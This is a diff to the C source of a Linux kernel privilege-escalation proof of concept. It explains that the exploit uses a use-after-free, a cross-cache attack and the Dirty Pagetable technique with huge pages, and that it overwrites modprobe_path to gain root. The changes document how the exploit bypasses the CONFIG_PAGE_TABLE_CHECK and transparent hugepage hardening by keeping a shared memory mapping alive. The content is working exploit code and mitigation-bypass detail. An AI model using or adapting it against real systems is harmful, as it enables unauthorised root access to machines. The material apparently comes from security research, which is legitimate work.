@@ -8,12 +8,11 @@
  * (they don't break the implemented cross-cache attack):
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
- *
- * (they don't break the implemented Dirty Pagetable attack)
- *   - CONFIG_PAGE_TABLE_CHECK
- *   - CONFIG_TRANSPARENT_HUGEPAGE
  * 
  * This PoC performs the Dirty Pagetable attack via huge pages and gains LPE.
+ * 
+ * You may also compile the kernel with CONFIG_PAGE_TABLE_CHECK and CONFIG_TRANSPARENT_HUGEPAGE,
+ * since this PoC can bypass them combined.
  * 
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
@@ -131,27 +130,31 @@ int act(int act_fd, int code, int n, char *args)
 
 int prepare_page_tables(void)
 {
+	int fd = -1;
 	unsigned long *addr = NULL;
 	long i = 0;
-	int fd;
 
 	printf("[!] preparing page tables\n");
 
 	/*
-	 * We use the SHM file to freeze the memory once the PoC is finished.
-	 * This allows us to bypass PAGE_TABLE_CHECK hardening when data is freed.
-	 * Since the file exists after finishing, we never reach the page refcount check.
+	 * Let's use POSIX shared memory to keep the memory mapping
+	 * after the exploit process finishes. That is needed to bypass
+	 * the CONFIG_PAGE_TABLE_CHECK mitigation.
 	 */
 	fd = shm_open("/notavirus", O_CREAT | O_RDWR, 0666);
 	if (fd < 0) {
-		perror("shm_open");
+		perror("[-] shm_open");
 		return EXIT_FAILURE;
 	}
 
+	/* Set the size of the created shared memory object */
 	if (ftruncate(fd, PAGE_SIZE) < 0) {
-		perror("ftruncate");
+		perror("[-] ftruncate");
 		return EXIT_FAILURE;
 	}
+
+	printf("[+] shared memory object is created\n");
+
 	/*
 	 * Prepare the resources for PUD that will later reclaim
 	 * the freed slab containing UAF object.
